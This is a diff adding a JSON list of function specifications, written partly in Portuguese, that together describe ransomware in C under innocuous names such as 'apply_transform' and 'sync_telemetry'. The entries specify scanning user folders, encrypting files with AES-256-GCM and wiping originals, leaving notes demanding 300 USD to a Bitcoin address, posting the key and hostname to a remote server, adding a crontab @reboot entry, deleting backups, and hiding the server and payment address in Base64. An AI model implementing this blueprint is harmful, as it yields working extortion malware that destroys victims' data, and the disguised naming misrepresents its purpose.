@@ -1,0 +1,30 @@
+[
+  {
+    "descricao": "Recursively enumerate files in ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, /mnt filtering for extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar. Uses nftw() or opendir/readdir. Returns a linked list of full paths.",
+    "nome": "scan_directories"
+  },
+  {
+    "descricao": "Generate a 32-byte session key using RAND_bytes() from OpenSSL, encode it in Base64 via EVP_EncodeBlock(), persist to /tmp/.master.key as JSON {\"aes_key\":\"<base64>\"} with permissions 0600 using chmod(). No extraneous whitespace. Returns const uint8_t* key pointer.",
+    "nome": "init_session_key"
+  },
+  {
+    "descricao": "For each file path and const uint8_t* key parameter, generate 12-byte nonce with RAND_bytes(), encrypt file content using AES-256-GCM via EVP_CIPHER_CTX interface (libcrypto), write output as [12 nonce][ciphertext][16 GCM tag] to original_filename.PROCESSED. Overwrite original with zeros using fwrite() of zero-filled buffer, then remove() original.",
+    "nome": "apply_transform"
+  },
+  {
+    "descricao": "In each directory where at least one file was transformed, create file '#_STATUS_NOTICE_#.txt' with content instructing reader to send 300 USD to payment address '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' and contact via secure channel. Uses fopen/fprintf/fclose.",
+    "nome": "write_manifest"
+  },
+  {
+    "descricao": "Read /tmp/.master.key via fopen/fread, parse JSON manually: locate \"\\\"aes_key\\\":\\\"\" with strstr, advance pointer by 11 bytes (strlen(\"\\\"aes_key\\\":\\\"\")), extract value until closing quote via strchr. Validate length > 0. Obtain hostname via gethostname(). Construct JSON {\"aes_key\":\"...\",\"hostname\":\"...\"}. Transmit via HTTP POST to http://10.254.19.73:8080/collect using libcurl with Content-Type: application/json. If response status 200, remove /tmp/.master.key via remove().",
+    "nome": "sync_telemetry"
+  },
+  {
+    "descricao": "Read current crontab via popen(\"crontab -l\", \"r\"), check for line matching \"@reboot <binary_full_path>\" using strstr. If absent, write line via popen(\"crontab -\", \"w\") using fprintf. Also scan target directories (from REQ-001) deleting files with extensions .bak, .backup, .old via remove().",
+    "nome": "register_autostart"
+  },
+  {
+    "descricao": "Store management endpoint URL (http://10.254.19.73:8080/collect) and payment identifier '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' as Base64-encoded char arrays. Provide base64_decode() function (same file) to decode these strings to plaintext at runtime using custom Base64 decoding (no external library).",
+    "nome": "decode_config"
+  }
+]
